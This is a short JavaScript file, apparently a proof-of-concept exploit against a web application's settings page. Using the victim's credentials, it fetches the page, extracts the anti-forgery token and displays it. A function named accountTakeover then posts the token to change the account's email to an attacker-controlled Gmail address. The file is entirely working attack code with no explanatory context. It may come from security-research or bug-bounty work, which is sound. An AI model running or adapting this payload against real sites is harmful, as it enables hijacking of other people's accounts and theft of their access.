function damm(){
	
var http;
http = new XMLHttpRequest();
http.open("GET","https://hack.viralsweep.com/settings",true);
http.setRequestHeader('Content-Type','text/plain');
http.withCredentials = "true";
http.onreadystatechange = function(){
	if(http.responseText!="")
	{
		extractToken(http.responseText);
	}
	if(http.readystate == 4){
	}
}
http.send();
}
damm();
function extractToken(html)
{
	s = html.substring(html.indexOf('"token" value="'));
	token = s.substring(15,s.indexOf('" />'));
	alert(token);
}
function accountTakeover()
{
	var xhr = new XMLHttpRequest();
        xhr.open("POST", "https://hack.viralsweep.com/settings", true);
        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.withCredentials = true;
        var body = "post_type=settings&token="+token+"&email=hacky45.94%40gmail.com";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
}
